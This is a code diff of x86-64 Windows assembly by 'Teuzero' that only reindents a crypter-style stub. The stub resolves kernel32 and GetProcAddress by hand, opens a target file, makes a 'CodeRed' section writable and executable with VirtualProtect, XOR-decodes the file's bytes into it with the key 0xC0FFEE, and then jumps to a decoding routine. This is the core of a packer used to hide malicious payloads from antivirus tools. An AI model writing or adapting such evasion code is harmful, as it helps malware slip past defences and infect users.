@@ -343,62 +343,61 @@ section .deccode
 section .text
 WinMain:
     Start:
-        ;***************
-        ;**** START ****
-        ;***************
-        ;* By: Teuzero *
-        ;***************
-        add rsp, 0xfffffffffffffdf8; # Bytes Vazios
-		
-        ; Obtem o endereço base do kernel32.dll 
-        call Locate_kernel32
-        call IAT
-        call FinFunctionGetProcAddress
-        call LoadLibraryA
-        call LoadMsvcrt
-        call PrintMsgConsole
-        call PegaNomeDoaquivo
-        call OpenFile
-        mov rbp,rdi
-        mov r10, rbp ; Arquivo alvo
-        ;Nome do proprio programa
-        mov rax, "T0.exe"
-        add rsp, 0x20
-        mov [rsp+0x10], rax
-        xor rax, rax
-        mov rax, [TamArqProgram]
-        mov [TamArqTarget], rax
-		xor r10,r10
-		call Locate_kernel32
+	;***************
+	;**** START ****
+	;***************
+	;* By: Teuzero *
+	;***************
+	add rsp, 0xfffffffffffffdf8; # Bytes Vazios
 
-		call VirtualProect
-		;CALL VirtualProtect 
-		mov r10, [TamArqTarget]
-		add r10, 0x77
-		sub rsp, 0x30
-		push rsp
-		mov r9, rsp
-		mov r8d, 0x40
-		mov rdx, r10
-		mov ecx, CodeRed
-		sub rsp, 0x30
-		call rsi
-		add rsp, 0x30
-		
-		mov ecx, 0
-		mov rax, CodeRed
-		mov rdx,[TamArqTarget]
-		xor rcx,rcx
-		WriteSecion:
-			mov rbx, [rbp]
-			xor rbx, 0xC0FFEE
-			mov [rax], rbx
-			inc rax
-			inc rbp
-			
-			dec rdx
-			cmp rcx,rdx
-			jne WriteSecion 
+	; Obtem o endereço base do kernel32.dll 
+	call Locate_kernel32
+	call IAT
+	call FinFunctionGetProcAddress
+	call LoadLibraryA
+	call LoadMsvcrt
+	call PrintMsgConsole
+	call PegaNomeDoaquivo
+	call OpenFile
+	mov rbp,rdi
+	mov r10, rbp ; Arquivo alvo
+	;Nome do proprio programa
+	mov rax, "T0.exe"
+	add rsp, 0x20
+	mov [rsp+0x10], rax
+	xor rax, rax
+	mov rax, [TamArqProgram]
+	mov [TamArqTarget], rax
+	xor r10,r10
+	call Locate_kernel32
+
+	call VirtualProect
+	;CALL VirtualProtect 
+	mov r10, [TamArqTarget]
+	add r10, 0x77
+	sub rsp, 0x30
+	push rsp
+	mov r9, rsp
+	mov r8d, 0x40
+	mov rdx, r10
+	mov ecx, CodeRed
+	sub rsp, 0x30
+	call rsi
+	add rsp, 0x30
+
+	mov ecx, 0
+	mov rax, CodeRed
+	mov rdx,[TamArqTarget]
+	xor rcx,rcx
+	WriteSecion:
+		mov rbx, [rbp]
+		xor rbx, 0xC0FFEE
+		mov [rax], rbx
+		inc rax
+		inc rbp
+		dec rdx
+		cmp rcx,rdx
+		jne WriteSecion 
 
 	call decCode
 ret
